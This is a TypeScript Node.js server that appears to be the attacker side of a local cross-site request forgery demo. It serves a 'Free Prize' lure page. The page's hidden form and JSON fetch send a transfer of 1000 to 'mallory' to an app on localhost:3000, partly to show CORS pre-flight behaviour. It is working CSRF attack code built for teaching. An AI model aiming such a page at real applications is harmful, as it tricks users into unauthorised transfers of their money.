import { createServer, IncomingMessage, ServerResponse } from "node:http";

const server = createServer(async (request, response) => {
  try {
    await handleRequest(request, response);
  } catch (error) {
    console.error(error);

    if (!response.headersSent) {
      response.statusCode = 500;
      response.setHeader("Content-Type", "text/plain; charset=utf-8");
    }

    response.end("Internal Server Error");
  }
});

server.listen(4000, () => {
  console.log("Server listening on http://localhost:4000");
});

async function handleRequest(
  request: IncomingMessage,
  response: ServerResponse,
) {
  const url = new URL(request.url ?? "/", "http://localhost");

  if (request.method === "GET" && url.pathname === "/") {
    sendHtml(
      response,
      `<html>
<head>
  <title>Attacker</title>
</head>
<body>
  <h1>Free Prize</h1>
  <p>Claim your reward below.</p>
  <form method="POST" action="http://localhost:3000/transfer">
    <input type="hidden" name="to" value="mallory" />
    <input type="hidden" name="amount" value="1000" />
    <button type="submit">Claim reward</button>
  </form>

  <hr />
  <h2>Try the non-simple transfer endpoint</h2>
  <p>
    This uses JSON and a custom header, so the browser should send a pre-flight
    request before attempting the cross-origin POST.
  </p>
  <button type="button" id="claim-json-reward">Claim JSON reward</button>
  <pre id="json-result"></pre>

  <script>
    const button = document.getElementById("claim-json-reward");
    const result = document.getElementById("json-result");

    button.addEventListener("click", async () => {
      result.textContent = "Sending cross-origin JSON transfer...";

      try {
        const response = await fetch("http://localhost:3000/transfer-json", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Transfer-Intent": "attacker",
          },
          body: JSON.stringify({ to: "mallory", amount: "1000" }),
        });

        result.textContent = "Response status: " + response.status;
      } catch (error) {
        result.textContent = "Request failed: " + error;
      }
    });
  </script>
</body>
</html>`,
    );
    return;
  }

  response.statusCode = 404;
  response.setHeader("Content-Type", "text/plain; charset=utf-8");
  response.end("Not Found");
}

function sendHtml(response: ServerResponse, body: string, statusCode = 200) {
  response.statusCode = statusCode;
  response.setHeader("Content-Type", "text/html; charset=utf-8");
  response.end(body);
}
